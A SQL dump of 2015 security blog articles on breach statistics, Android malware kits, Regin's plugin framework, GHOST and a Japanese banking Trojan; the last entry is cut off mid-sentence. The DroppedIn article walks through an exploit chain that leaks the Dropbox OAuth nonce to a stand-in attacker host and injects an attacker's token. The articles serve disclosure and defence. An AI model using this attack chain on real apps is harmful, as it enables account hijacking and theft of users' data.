INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (446, 'Are Cracks in the Digital Foundation of the Internet Crumbling the Core?', 'Leslie Horacek', '2015-3-16', 'Today we released the first edition of the  , where we focus on a year-end review of all the attack and breach activity that occurred in the previous year, along with some interesting new twists to the methodology of how vulnerabilities are disclosed. If the year 2014 felt to you like a never-ending roller coaster ride of thrills and excitement within the world of Internet security, you wouldn’t be the only one. We witnessed over a billion records of personally identifiable information (PII) leaked this past year, with attackers applying creative new approaches to fundamental attack types such as SQLi, malware and DDoS. The below graphic provides some perspective on what a billion or more records might look like when compared with population sizes. While each breached record doesn’t necessarily denote an individual user, it is still likely that a significant percentage of the Internet-connected population experienced some form of loss as a result of security incidents in 2014. While condensing and correlating the year’s many diverse security incidents, we found three distinctive, overarching themes: While general attack types remain consistent year to year, creative applications of these fundamental building blocks can vary greatly. Focusing on security fundamentals, such as password diligence, can provide a base level of protection that is invaluable. We’ve long been accustomed to the naming of popular worms and exploits; even exploit kits are well-known, marketed and discussed with clever names such as “Blackhole,” “Sweet Orange,” “Nuclear” and “Neutrino,” to name just a few. However, in 2014 we were introduced to our first taste of the “designer vuln,” a critical vulnerability that not only proved lethal for targeted attacks, but also had a cleverly branded logo, website and call name (or handle) that would forever identify the disclosure. These designer vulns appeared within long-held foundational frameworks used by the majority of websites, and they continued throughout 2014, garnering catchy name after catchy name:  ,  , POODLE and, into 2015,   and FREAK. We began to discuss vulnerability disclosures with the ease of a branded name and logo rather than boring old CVE identifiers like CVE-2014-1060. Another surprising twist in 2014 came in September, when a disclosure by a CERT/CC researcher announced an automated tool to test the security of Android applications, known as Tapioca. Using this tool, he discovered security issues in thousands of Android applications. These vulnerabilities can allow an attacker to perform man-in-the-middle (MitM) attacks against affected mobile applications. This effort has (so far) produced literally thousands of disclosures of individual applications vulnerable to MitM attacks. In other words, these reports represent the same fundamental vulnerability affecting a wide variety of individual applications. They do not represent thousands of unique methods of attacking different applications; they represent one way of attacking thousands of applications. X-Force cataloged more than 9,200 new security vulnerabilities affecting over 2,600 unique vendors in 2014. This number includes the roughly 1,400 Android SSL issues that have CVE IDs and does not contain the potential 20,000+ that are still being tracked in the CERT/CC vulnerability disclosure. This tabulation represents a 9.8 percent increase over 2013 and is the highest single year total in the 18-year history of X-Force. This announcement not only changed the 2014 year-end count, but also the discussion on how disclosures should be recorded and will likely be a matter of debate by the CVE editorial board until new choices are determined. Continuing the discussion surrounding Android application development, within the report we also review the unusual apathy mobile app developers seem to be displaying, leaving important banking applications vulnerable to critical disclosures made at the midyear for the  . Despite warnings, 10 of the 17 banking applications we tracked (59 percent) were still vulnerable four months later. Finally, to round out the year-end review, we take a historical look back at how crowd-sourced malware is creating   and pursuing industries beyond the original financial targets. In response to the high capacity, volume and nature of attacks that have continually increased over time, X-Force is launching the   website to help users gain an in-depth understanding of security events in the current year, as well as a historical perspective of how things have evolved year to year. We encourage you to visit this site often to stay up-to-date on the latest breaches and security incidents as they are confirmed by public sources. Stay tuned for an upcoming Security Intelligence article where we’ll give some   into this interactive data visualization.', '\'IBM X-Force Report\', \'IBM X-Force Research\', \'X-Force\', \'X-Force Threat Intelligence Quarterly\'', 'https://securityintelligence.com/cracksinthefoundation/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (447, 'MazelTov! More Android Malware Coming to a Mobile Device Near You', 'Limor Kessem', '2015-3-12', 'Today’s motley cybercrime economy is by no means unfamiliar grounds to those tasked with defending their organizations from its many nefarious devices. Cybercriminals congregate in underground forums and darknets globally, peddling everything a would-be cybercriminal could need, from   and   to   or a place to hide a botnet. However, while many odd things are bought and sold in the dark enclaves of the Internet, it’s not often that one encounters the more comprehensive breed of toolsets for malicious purposes. One such discovery was recently made by the IBM Security Trusteer Researchers, who uncovered a new Android malware-spreading kit offered for sale in the Russian-speaking cybercrime community. The vendor of the kit dubbed it “MazelTov” — only unlike the real term, which means “good fortune” in Hebrew, the effects of this botnet-building toolkit are exactly the opposite, at least for the victims. MazelTov is a toolkit — dubbed an “APK Download System” by its creator — that is designed to help cybercriminals upload and spread mobile malware to Android-based user devices, granting them control and providing them with statistics on their infection campaign’s success. The kit includes every possible commodity cybercriminals need on their quest to upload malware to third-party Android application markets and spread it from there to unsuspecting users. Mobile malware, and the botnets formed by them, are not new per se, but the level of elaborated facilitation in toolkits such as MazelTov is rare. These types of turnkey, crime-friendly services put new capabilities into the hands of every cybercrime newcomer and help seasoned criminals branch out from their PC-based activities to harvesting mobile fraud. In an interesting post discovered by the IBM Security Trusteer Researchers, MazelTov’s kit vendor starts off by pointing out to peers that “the Android traffic and malware installations market is growing rapidly. There are new and interesting ways to monetize Android installations.” And he is right. The past two years have introduced mobile platforms to a plethora of malicious applications created for illicit financial gain. This was all made possible by compromising user devices, leveraging that foothold for launching malicious apps and ultimately turning that into money. From adware, spyware and click fraud to automating covert premium SMS or phone calls, stealing two-factor authentication codes or the almighty remote root access, six out of 10   are related to programs capable of stealing users’ money. Let’s take a look at what the MazelTov toolkit offers and how it facilitates launching Android malware infection campaigns. For $3,000 or the bitcoin equivalent, the customer will receive the following: Simply put, the MazelTov offering is an effective means to turning a piece of malware into an active infection campaign. Those using it can choose the type of malicious app to spread, but judging by the statistics, they will go after banking customers. Nearly half of all Android malware apps can steal money. Of those, 66 percent steal online banking transaction tokens, and the rest grab online banking credentials and credit card data, according to  . As for the Android-based device users such services ultimately target, this progression is concerning because it directly affects their financial accounts and phone bills. The significant and rapid move to mobile devices for banking, payments and shopping has turned smartphones into the new hot spot for malware-enabled fraud. That’s exactly where cybercriminals focus their efforts and offerings nowadays. The migration of cybercriminals from PCs to mobile has resulted in financial attacks against Android users more than tripling in 2014 and malware infecting as many Android devices as   that same year. The outlook for 2015 calls for more of the same. With these statistics and forecasts, financial institutions that offer mobile banking and mobile payment to customers — as well as e-tailers and organizations whose business growth relies on mobile apps — should address this increased risk by hardening their applications from within. Financial services providers and organizations that wish to learn more about protecting their mobile apps, the Android user base and the adverse effects of mobile malware may be interested to read about  . The advent of a highly instrumental offering such as MazelTov in the cybercriminal underground is an escalation that contributes to the prevalence of massively spread mobile malware and the risks that arise from it. The IBM Security Trusteer researchers continue to follow underground discussions and keep readers up-to-date on trends that affect the security of technology we use in everyday life.', '\'Android\', \'Cybercrime\', \'IBM Security Trusteer\', \'Malware\', \'Mobile Malware\'', 'https://securityintelligence.com/mazeltov-more-android-malware-coming-to-a-mobile-device-near-you/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (448, 'How Safe Is Your OS and Web Browser Combination Against the Most Prevalent Malware Strains?', 'Assaf Regev', '2015-3-12', 'Despite growing security measures, malware and Trojans are not only growing in number, but are also increasing in sophistication. Malware authors constantly seek new ways to use existing and/or unpatched zero-day vulnerabilities to create the next breed of cybercrime techniques. A recent blog post by  , a notable security researcher, makes reference to an undocumented vulnerability in   that targets different combinations of Internet Explorer versions running on a variety of operating systems, including Windows, Mac and Linux.  against unpatched vulnerabilities are popping up regularly and sometimes take months or even years for software publishers to patch. Armed with this knowledge, fraudsters rely on these time gaps when they design new techniques that are capable of stealing customer credentials and performing fraudulent transactions such as transferring money to new destinations — often without the victim being aware that anything is amiss. To top it off, cybercriminals are aware of the various fraud prevention technologies many organizations deploy and try to use this knowledge when designing new attack mechanisms to circumvent their existing fraud controls. For example, fraudsters can bypass various forms of authentication by using social engineering campaigns to convince users to divulge their credentials. The following are extracts from our latest  , as observed in the last quarter of 2014 by the IBM Security Trusteer research team. The infographic examines six of the most prevalent malware strains and attack techniques and their effect on popular operating systems and Web browsers. The higher the percentage, the more susceptible the operating system or Web browser is to the effect of the individual malware. The first example of note is  , which is known to steal user credentials, overcome various two-factor authentication methods and counter additional security measures on infected devices. Bugat specifically targets Firefox, Internet Explorer and Chrome, with very slight percentage variations between the three, as can be seen below. As for its effect on various operating systems, Bugat primarily targets Windows XP, Windows 7 and Windows Vista. Interestingly,   lags behind the other operating systems, currently holding a single-digit market share as compared to the other two. Nevertheless, it still provides a fertile ground on which this specific malware can operate. An additional point to note is the relatively low effect on the latest Windows operating systems, Windows 8 and Windows 8.1. One possible explanation is the fact that Microsoft has introduced numerous built-in security improvements into these operating systems, including an application reputation system and protection from  . Additionally, there are a number of low-level security improvements that let these operating systems manage memory in a more secure way, including features that make security vulnerabilities harder to exploit. Another interesting example is Zeus, which was first identified in 2007 and is specifically designed to steal online banking credentials. Despite the fact that the original Zeus kit is no longer developed, data shown below clearly demonstrates that this malware strain has remarkable distribution and a widespread effect on the various operating systems. One thing to note is the effect on Zeus on the Opera browser, as applied to the mobile channel. This is not the first sighting of known   code being reused for new attack methods using a mix of original and borrowed techniques. In this instance, Zeus is attacking mobile devices with users accessing their online banking platforms via Opera in what is known as Zeus-in-the-Mobile. While this information refers to the most prevalent malware strains and their immediate effect on the most popular operating systems and Web browsers, one cannot afford to remain stagnant. Cybercriminals are constantly attempting to find new ways of either persuading users to divulge their credentials or merely stealing them in a variety of sophisticated methods while performing fraudulent transactions on their behalf. This is exactly where Trusteer’s suite of cybercrime prevention products comes into play. The IBM Security Trusteer   comprises multiple adaptive layers of protection at the endpoint and Web application layers, powered by a Web-based threat intelligence platform policy and configuration management application and malware forensic services. The IBM Security Trusteer management application provides organizations with control over IBM’s deployment and visibility into real-time threat information. This lets security and IT professionals configure IBM’s protection layer to meet specific business requirements in today’s changing threat landscape while minimizing capital and operational expenses and maximizing the effectiveness of threat protection.', '\'Cybercriminals\', \'Cybersecurity\', \'Linux\', \'Malware\', \'Trojan\', \'Windows\', \'Zeus\'', 'https://securityintelligence.com/how-safe-is-your-os-and-web-browser-combination-against-the-most-prevalent-malware-strains/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (449, 'DroppedIn: Remotely Exploitable Vulnerability in the Dropbox SDK for Android', 'Roee Hay', '2015-3-11', 'The IBM X-Force Application Security Research Team has discovered a vulnerability in the   (CVE-2014-8889) which allows attackers to connect applications on mobile devices to a Dropbox account controlled by the attacker without the victim’s knowledge or authorization. This is a serious flaw in the authentication mechanism within any Android app using a   The vulnerability can be exploited in two ways, using a malicious app installed on the user’s device or remotely using drive-by techniques. It cannot, however, be exploited if the Dropbox app is installed on the device (it does not even need to be configured, just installed). Upon discovery of the vulnerability, the IBM team privately disclosed the issue to Dropbox. The response from Dropbox to this security threat was particularly noteworthy as they acknowledged receipt of the disclosure within a mere six minutes, confirmed the vulnerability within 24 hours, and released a patch within just four days. This undoubtedly shows the company’s commitment to security, this was one of the fastest response times the IBM Security team has seen in its long history of vulnerability research. With a patch solution available, it is highly recommended that developers update their Dropbox SDK library. Additionally, end users (device owners) must update their apps that rely on the SDK and are also encouraged to install the Dropbox app, which makes it impossible to exploit the vulnerability; this is because the vulnerable SDK code is not invoked when the local Dropbox app is installed. The following blog post gives a high-level overview of the vulnerability leveraging a proof-of-concept exploit the IBM X-Force team developed.    . It is no secret that the world is now storing private personal and business data in the cloud. In order to access this data, providers such as photo-sharing services or general-purpose storage services, are expected to be accessible not only by the user, but also by apps that leverage that data to enhance the user experience. In an effort to ease the development lifecycle and encourage an ecosystem of reliant solutions, cloud services often provide a framework, or rather a Software Development Kit (SDK) that apps can utilize. The Dropbox SDK for Android is such a framework, providing Android apps with a simple way to interface with Dropbox. These frameworks can be very appealing for app developers since they provide a simple client-side Application Programming Interface (API). From a security perspective, however, the frameworks themselves provide an extremely attractive attack surface since the vulnerability of the framework could potentially affect numerous applications that use it. According to  , which provides statistics about the prevalence of Dropbox SDK use for Android, 0.31 percent of all applications use the Dropbox SDK. Of the top 500 apps, the prevalence is higher, at 1.4 percent. Out of the 41 apps we examined as part of our initial research that use the Dropbox SDK for Android, 31 apps (76 percent) used a vulnerable version of the SDK. It is worth noting that the rest of the apps were vulnerable to a much simpler attack that has the same consequences but had been fixed by Dropbox in the SDK version 1.5.4, this older attack vector was notable in that it could not be prevented by installing the Dropbox app. For example, by exploiting this vulnerability, the IBM X-Force Application Security Research Team managed to attack a previous version of the 1Password app, as seen in this demo video: This app falls under the category of password management apps, and uses the Dropbox SDK to synchronize the user’s vault (key store) with Dropbox. This attack let us leak the victim’s vault to the attacker’s account, which could then crack its master password offline (if it were weak enough) or steal it using other techniques, such as a phishing attack. In order to prevent exploitation 1Password users should download the latest 1Password app, which contains a fixed Dropbox SDK. It should be noted that this attack technique does   put data saved to Dropbox from other solutions at risk to prying eyes. This blog post gives a high-level overview of the vulnerability and the attack we developed.    . Apps need to be authorized on the user’s Dropbox account in order to access data. A naïve solution would be to provide apps with the user’s credentials. Dropbox avoids this bad practice by leveraging the OAuth protocol, which does not disclose the credentials. This process begins with a single out-of-band registration of an app on the Dropbox website. As a result of this registration, the app developer receives an app and secret key from Dropbox, which are saved (hard-coded) in the application code. The OAuth ‘dance’ starts by the app calling the Dropbox SDK, requesting to authenticate the user and authorize the app. After receiving the request, the Dropbox SDK generates a cryptographic nonce — a very large, random number — helps in securing this process. The Dropbox SDK either invokes the browser or the Dropbox app (if it is installed), which presents the following familiar screens to Dropbox users: \nThe nonce is saved locally and is sent to Dropbox. The user next authenticates and authorizes the app to access Dropbox data using the API, which returns an access token and the nonce to the application. The returned nonce is compared with the locally saved one, and if they match, the access token, which allows the app to access the Dropbox data, is accepted and later consumed by the app. Since the nonce is a random number attackers cannot guess, it helps prevent a simple attack in which the attacker injects an access token pertaining to his or her account (instead of the victim’s). The goal of the attack is to link the app with the attacker’s account instead of the victim’s to either have the victim upload sensitive information or download malicious, attacker-controlled data that may be used as part of other attacks. Adding the nonce parameter, since the attacker cannot predict it, should have mitigated the threat. However, an implementation-specific vulnerability exists that lets attackers force the Dropbox SDK to leak that nonce to the attacker’s server, rendering the secrecy of the nonce useless. The CVE-2014-8889 vulnerability lets adversaries insert an arbitrary access token into the Dropbox SDK, completely bypassing the nonce protection. The code belongs to the   that is responsible for the Dropbox authentication. It consumes various   extra parameters. Since the browser can invoke this Activity, it can be launched by both   and malicious websites with an arbitrary Intent payload. Therefore, special care must be taken when consuming this Intent’s payload. Consumption of a particular Intent extra parameter, named INTERNAL_WEB_HOST, has devastating results. When the browser is used (i.e., the Dropbox app is not installed) to authenticate the user and authorize the app to access the user’s Dropbox account, this parameter eventually controls the host that the browser surfs to. If the attacker can generate an Intent targeting the activity, with INTERNAL_WEB_HOST pointing to his or her server, the authentication process will take place with the nonce sent to the attacker. The IBM X-Force Research Team developed a working proof of concept exploit, dubbed “ ” to test this vulnerability. This proof of concept allows the   to link a target app with the attacker’s Dropbox account instead of the victim’s without the victim’s knowledge. We created both local and remote (drive-by) end-to-end versions of the “DroppedIn” proof-of-concept attack. Both local and remote attacks fail if the Dropbox app is installed on the targeted device. In order to exploit the DroppedIn vulnerability, a couple of things need to happen, the following figure provides an overview of the remote attack:  The attack begins with a preliminary, out-of-band step. The attackers obtain an access token associated with their account and the attacked app. This is especially easy because attackers can simply download the app to their device, authorize it on their Dropbox account and record the returned access token pair.  The victim is lured to surf to an attacker’s controlled website or some page that the attacker has injected malicious data into.  Attackers cause the Dropbox SDK within the app to leak the nonce to their server. This is done by exploiting the aforementioned vulnerability, using a simple HTTP redirect. The HTTP redirect causes the vulnerable Dropbox SDK Activity to be invoked with the attack payload. The Intent will eventually trick the vulnerable Dropbox SDK Activity to request (using the browser) https://attacker:443/1/connect (with the nonce as a GET parameter). This implies that succeeding in the last step requires that the attacker owned a Secure Socket Layer certificate of his or her own domain, but this is rather easy.  The attackers now know the session’s nonce, so they can impersonate to Dropbox and inject their pregenerated access token from Step 1 into the app by another HTTP redirect.  At this point, the attacker’s token has been successfully injected into the target app. The missing piece of the puzzle is how the app consumes this data, which is up to the developer. More details about this step are available in the white paper. The first case study uses  , which is an app bundled with the Dropbox SDK. This app randomly fetches and displays images from the linked Dropbox account. While this is a sample app, we believe many lazy developers simply copy the Dropbox SDK calls and paste them into their own code. Exploiting this app lets attackers override the currently saved access token with their injected one, completely relinking the app with their account. The following image depicts a successful attack, with one of the author’s thumbs fetched from the attacker’s Dropbox account instead of the victim’s. This has been fixed with the current release of the Dropbox SDK. \n The second case study was identified using Microsoft Office Mobile. This app uploads the user’s documents to the cloud and supports multiple Dropbox accounts. The exploitation would occur   the user adds a new Dropbox account in order to be successful. According to the app’s logic, the user will be asked to enter his or her Dropbox credentials in the browser window. However, the app will still be linked — in the background and without the user’s consent — to the adversary’s account.  This would put all future documents the user saves using Microsoft Office Mobile at risk. Microsoft and Agilebits have updated their apps in the Google Play store to the new SDK that Dropbox has issued to address the vulnerability and to protect their customers. Dropbox has also updated the DBRoulette sample code which is bundled with the SDK. Users still are required to update their apps to ensure they are secure. The third case study was conducted using 1Password, which supports a single Dropbox account. The exploitation would once again occur before the user configures 1Password to use his or her Dropbox account. Again, according to the app’s logic, the user will be asked to enter his or her Dropbox credentials and the app will still be linked to the adversary’s. The current version of the app uses the newest SDK, and is not vulnerable. One way to quickly determine if you have been attacked by this vulnerability is to, from your PC, login in to Dropbox.com and look at your files using the browser window to identify if there are files you are archiving on your mobile device using Dropbox that are not present when you log in via a web browser on your computer. Dropbox SDK for Android Version 1.6.2 and later incorporates a fix for this security vulnerability. The vulnerable Dropbox SDK Activity no longer accepts input parameters from the incoming Intent’s extras. This makes it impossible for the attacker to control the host with which the Dropbox SDK communicates in order to leak the nonce. Developers are strongly encouraged to update their SDK to the latest version. In order to avoid exploitation of slowly updating apps, end users should update their apps to the latest versions and install the Dropbox app, which makes exploitation impossible.', '\'Android\', \'Application Security\', \'Dropbox\', \'Exploit\', \'IBM X-Force Research\', \'Mobile\', \'Mobile Security\', \'Vulnerability\'', 'https://securityintelligence.com/droppedin-remotely-exploitable-vulnerability-in-the-dropbox-sdk-for-android/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (450, 'Understanding Regin’s Plugin Framework: Part 2', 'Mark Yason', '2015-3-10', 'This blog post is the second part of my two-part post on Regin’s Stage 4 (32-bit) dispatcher module. In this second part, I will discuss the Regin plugin framework hosted in the dispatcher module. I will also discuss how knowledge of   can be used — and was used — to link a piece of malware to the Regin platform. The dispatcher module hosts the plugin framework responsible for plugin management. For this purpose, the dispatcher module exposes a plugin framework interface ( ), which it passes to the loaded plugins so they can access the services provided by the plugin framework. In addition to the dispatcher module, which runs in user mode, a corresponding plugin framework is also implemented in the   “VMEM.sys” (found in     as sample  ) to support kernel mode plugins. As a side note, in addition to hosting the user mode version of the plugin framework, the dispatcher module itself contains 12 embedded plugins. Using the sample discussed and repaired in   of this blog post, you can enumerate the list of embedded plugins by looking at RVA 0x00053010. That address contains an array of   structures, which, among other things, contain the plugin’s WORD-sized   and the pointers to the functions used for initializing, invoking and deinitializing the plugin. The following are the fields of the   structure (note that the structure names are inferred from the purpose of the structures): Below are examples of the   structure for the TCP transport plugin (Plugin 50035) and the UDP transport plugin (Plugin 25) found at RVA 0x0005322C and RVA 0x00053268: An important part of the plugin framework is the  . The   provides the plugins a way to access the services of the plugin framework, even if they are located in another module/DLL. The following are the fields of the   structure: Two important parts of the   are the two sets of functions it provides to the plugins — the   which include functions such as basic memory allocation and deallocation, thread creation and basic plugin method invocation. The second set, the  , is a set of functions heavily used by plugins, since it includes functions such as the allocation and deallocation of plugin-related data structures, helper functions for serializing parameters to be passed to plugin methods and convenience functions for the different ways plugin methods can be invoked. The following are some examples of the functions exposed via the   list: Before a plugin can be used, its initialization routine is called with a pointer to the   passed as the first argument. In the initialization code, the plugin allocates the following   structure: The   structure is a plugin-scope data structure used by the plugin’s methods in order to access the services of the plugin framework via the   field. It is also the data structure used by the plugin framework to route calls to the plugin’s methods via the   field. Below is the start of the plugin initialization code of Plugin 50035 (TCP transport). The code sequence is a typical plugin initialization sequence that is also found in other Regin plugins embedded in the dispatcher module: The plugin initialization is also where functions are registered as methods of the plugin. Below is an example of a typical plugin method registration code sequence in which Method 50 of Plugin 50035 (TCP transport) is registered: By analyzing the method registration code, you can identify which functions in the binary are the methods of a particular plugin and which   represents them. That information, on the other hand, will be helpful when looking at a plugin method invocation code (discussed next) for determining which actual function is executed. Finally, once the plugins are initialized, the plugin will be available to the plugin framework and its methods can be invoked using a   and   pair — also described as major and minor tuple in  . Plugin methods are invoked by methods of the same plugin (intra-plugin calls). They are also invoked by methods of other plugins (inter-plugin calls). Plugin methods can be invoked synchronously or asynchronously. Also, unlike typical functions, arguments passed to plugin methods are not passed via the stack. Instead, arguments are serialized and stored in a   structure (see   structure). To make it easy to invoke plugin methods, the plugin framework provides the necessary services for serializing and deserializing arguments and invoking plugin methods. A plugin method invocation code sequence usually begins with an allocation of a   structure. Next, plugin method arguments are serialized to the   structure. Finally, the plugin method is invoked. The example below is the invocation of Method 7 of Plugin 50035 (TCP transport). Method 7 accepts one DWORD value as an argument: By looking at the plugin method registration of Plugin 50035, you can determine which function will actually be executed when Method 7 is invoked. Since a Regin plugin needs to perform certain plugin-related tasks — such as plugin initialization, plugin method registration and plugin method invocation — and performing these tasks requires the use of the Regin plugin framework data structures, you can identify whether a certain malware is a Regin plugin by looking for certain code patterns before applying the Regin data structures. One instance in which malware was linked to the Regin platform is when Costin Raiu and Igor Soumenkov of   noticed that the QWERTY keylogger malware previously reported by   is a Regin plugin. Their   was a shared code found between the Regin “50251” plugin and the QWERTY “20123” module. Their   was the QWERTY “20123” module referencing the Regin “50225” plugin. The   was the QWERTY “20123” module having a startup code found in other Regin plugins. Having understood the data structures related to Regin’s plugin framework and having remembered the code patterns found in Regin plugins, I agree with their conclusion — even without a prior understanding of the Regin “50251” and “50225” plugin. First, let’s take a look at the QWERTY “20123” module startup code described by Raiu and Soumenkov. Below is the original disassembly: After applying Regin’s plugin framework data structures, it becomes immediately clear that the code is indeed a typical Regin plugin initialization sequence, as seen below: Furthermore, here is the original disassembly where Raiu and Soumenkov noticed the QWERTY “20123” module referencing the Regin “50225” plugin: Again, after applying Regin’s plugin framework data structures, it becomes apparent that the code is indeed a valid Regin plugin invocation sequence: Clearly, the Regin data structures matched the data structures used by the QWERTY “20123” module, and the same can be said for the QWERTY “20120” and “20121” modules. Regin’s plugin framework gives a glimpse of the sophistication of the Regin platform, where a mechanism exists that lets the platform be extensible via pluggable modules. The plugin framework is also a complex piece of machinery to reverse engineer. To comprehend it, numerous data structures and functions needed to be reversed and understood. I hope this blog post can help other reverse engineers and   looking at Regin. Finally, as we learn more about the internals of Regin’s plugin framework, it is interesting to see which types of   will be linked to the Regin platform.', '\'IBM X-Force Research\', \'Kaspersky Lab\', \'Malware\', \'Regin Dispatcher Module\', \'Symantec\', \'X-Force\'', 'https://securityintelligence.com/understanding-regins-plugin-framework-part-2/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (451, 'Protecting the Endpoint Against Advanced Malware and Zero-Day Threats', 'Tamar Shafler', '2015-3-10', 'While network-based security solutions provide protection for an enterprise’s network, it is only on the endpoint that full visibility and immediate prevention are possible. For example, consider employees who   or travel frequently and are thus not subjected to network controls, or those who use untrusted removable media that could get infected and introduce malware into the corporate network. In favor of business continuity, some network-based security controls allow suspicious files to download while they are analyzed and only sound the alarm after it’s too late. Additionally, advanced malware is constantly evolving to bypass security controls, learning how to travel through encrypted channels, stay concealed in password-protected files or remain idle while waiting to be triggered by user action. Having a presence on the endpoint is imperative for real-time protection against  . In recent years, advanced malware has become more sophisticated in multiple ways. First, it is evasive. Advanced malware aims to infect systems without being noticed. Many traditional security controls rely on blacklisting known malicious files, behaviors or command-and-control (C&C) destinations. To bypass such controls, malware has taken to polymorphism — slightly changing the malicious code so it won’t match the known signatures or patterns — and using dynamically assigned servers. In the  , cybercriminals can find off-the-shelf tools to help facilitate this. In response to sandboxing solutions that tried to cope with evasive malware, new, more sophisticated threats can identify whether they’re being run in a user environment or a sandbox or simply await a specific user interaction to activate. Second, it is persistent. The threat of advanced malware doesn’t end with the download of malicious code. In order to achieve its goals, malware needs to run and stay unnoticed for a long time — even after the infected host has been rebooted. To achieve this goal, malware will install and disguise itself as a benign, legitimate application to prevent identification by traditional controls. Finally, malware communicates outside the network. The goal of attackers is to gain access to and/or steal sensitive information with which they can achieve a competitive advantage, compromise a company’s reputation or gain leverage. For that, advanced malware needs to communicate with some C&C servers to announce it has completed the first phase of entering the target organization, receive updates and, of course, send the stolen sensitive information to the attacker. \n When a threat is carried out by exploiting a vulnerability that has never been previously published, it is called a  . Since the vulnerability is not publicly known, there is no available patch that addresses it and fixes the bug that caused the vulnerability. Malicious code that makes use of this vulnerability cannot be identified as a known exploit by security controls that rely on prior knowledge. People prefer to use as few passwords as possible. It is not uncommon for someone to use the same   to access a corporate intranet site, their personal Web mail, a public social network and an e-commerce site. In October 2014, millions of   were compromised. In May 2014, 145 million   were stolen. Mail providers, social networks, retailers and mobile providers have all been breached, resulting in compromised user credentials. If an employee’s credentials to a public site are stolen, it is not that difficult to deduce that employee’s corporate username. From there, the door is open for an attacker to get a foothold into the organizational network. IBM Security Trusteer’s Apex Advanced Malware Protection™ protects employee endpoints from advanced threats by leveraging a unique, positive behavior model. It does not rely on prior knowledge of specific types of malware, exploits or vulnerabilities, but rather identifies and blocks threats in real time by tracking processes’ behavior and identifying illegitimate flows. This enables   to address previously unreported malware and zero-day threats. Additionally, Trusteer Apex protects employees from corporate credentials theft through phishing sites and prevents   from being reused on third-party websites.', '\'Advanced Malware\', \'Endpoint Protection\', \'IBM Security Trusteer\', \'Malware\', \'Trusteer Apex\', \'Zero-Day Vulnerability\'', 'https://securityintelligence.com/protecting-the-endpoint-against-advanced-malware-and-zero-day-threats/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (452, 'WordPress and the GHOST Vulnerability', 'Ryan Dewhurst', '2015-3-6', 'On Jan. 27, Qualys released a   advisory for what it termed the “ ” vulnerability. This was a few hours after the vulnerability was mistakenly leaked by a public relations agency on a French  , possibly forcing the company’s hand to release the advisory before it had planned to. The vulnerability is a buffer overflow vulnerability within the   function of the GNU C Library (glibc). The buffer overflow can be triggered within the   functions, which return IPv4 addresses for given Domain Name System hostnames. MITRE assigned this vulnerability with the   identifier. The glibc library defines the system calls for C programs running on Linux-type systems. The C programming language first appeared in 1972. It is still widely used today in many types of software, such as operating systems, Web browsers and other programming languages. Some of the programming languages using C as an implementation language include C++, Perl, Python, Java, PHP, Ruby, Rust and Go. These programming languages may also use the vulnerable   glibc functions.   first confirmed the vulnerability affected PHP’s   function. It is easy to verify this by using a few simple commands on an unpatched Ubuntu 12.04 machine. By executing the following proof-of-concept command released by Sucuri, PHP crashes with a segmentation fault — a clear sign the payload corrupted the system’s memory: To investigate this further, we can run PHP with the payload in a debugger to be able to view the error’s full stack trace: As we can see from the stack trace above the segmentation, fault happened within the   file, the GNU C Library (glibc). This confirms the bug also exists within PHP’s   function, but it does not mean it is necessarily exploitable. Doing a similar test against the Ruby programming language shows Ruby 2.0.0 correctly validates the length of the hostname: The Python programming language also seems to handle large hostnames correctly: At this time, no exploit has been publicly released for the GHOST vulnerability. According to  , it has a working exploit for the GHOST vulnerability but will only release it once 50 percent of machines have been updated. I suspect there are many skilled people independently working on writing an exploit, and we may see one released before Qualys officially releases its own. Because PHP’s   function is vulnerable to the GHOST vulnerability, any application written in PHP that uses this function may also be vulnerable. All that is required is for user-controlled input, known as a source, to reach the vulnerable function, known as a sink. According to Matt Mullenweg,   of the Web runs on the software he founded, WordPress. Although hinted before by Sucuri,   successfully showed that the GHOST vulnerability could be triggered within WordPress by a remote unauthenticated attacker. To do this, the WordPress XML-RPC pingback application programming interface (API) is used to send an overly large hostname, resulting in the process handling the request to crash. This could mean that when someone finally releases an exploit, any Web servers running   may also be exploitable. A   module has also been released that can check whether a system is vulnerable to the GHOST vulnerability by using the WordPress pingback API. I suspect that WordPress will attempt to prevent this vulnerability from being exploited in its latest release. One way of doing this is by ensuring the hostname passed to the pingback API is fewer than 256 bytes long. This would be in accordance with  . It has also been found that there are many popular WordPress plugins that rely on the vulnerable   function. Even if WordPress does release a patch, your installation may still be vulnerable through one of its affected plugins. If you have not patched your system yet, I would highly recommend doing it as soon as possible. If you are running WordPress, you may also be able to take other mitigating actions. The following are some suggestions:', '\'Cyberattack\', \'Exploit\', \'GHOST Vulnerability\', \'Linux\', \'PHP\', \'Programming Language\', \'Python\', \'Vulnerability\', \'WordPress\'', 'https://securityintelligence.com/wordpress-ghost-vulnerability/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (453, 'Tsukuba: Banking Trojan Phishing in Japanese Waters', 'Dani Abramov', '2015-3-4', 'Named after Japan’s science city, Tsukuba is a recent   discovery made by IBM Security Trusteer researchers. It unearths the malicious activity of a new banking Trojan in the global cybercrime arena that is highly focused and exclusive to Japanese financial institutions. Technically speaking, Tsukuba is no more sophisticated than run-of-the-mill proxy changers, which are typical attack tools used in   and the surrounding region. Although it may not be very advanced in its technical capabilities, it makes up for it through its most recent social engineering technique, which is how it harvests victims’ online banking credentials, personally identifiable information (PII) and even clear images of official identification documents. With the information Tsukuba can collect from infected endpoint owners, the gang operating this Trojan can monetize the data in numerous identity theft and online fraud scenarios to rob bank accounts, credit cards, online loans, e-wallets and more. What makes Tsukuba all the more potent, however, is the fact that banking customers in Japan are less accustomed to seeing Trojan attacks in their region than those in English-speaking countries. The language barrier — one factor that has protected some companies from fraud — has also served to keep their general population more naïve to it and, therefore, less suspecting of Tsukuba’s unique methods. Tsukuba’s malware capabilities reveal that it is a   from the proxy changers family. Its main goal is to manipulate the browser on infected endpoints to redirect victims 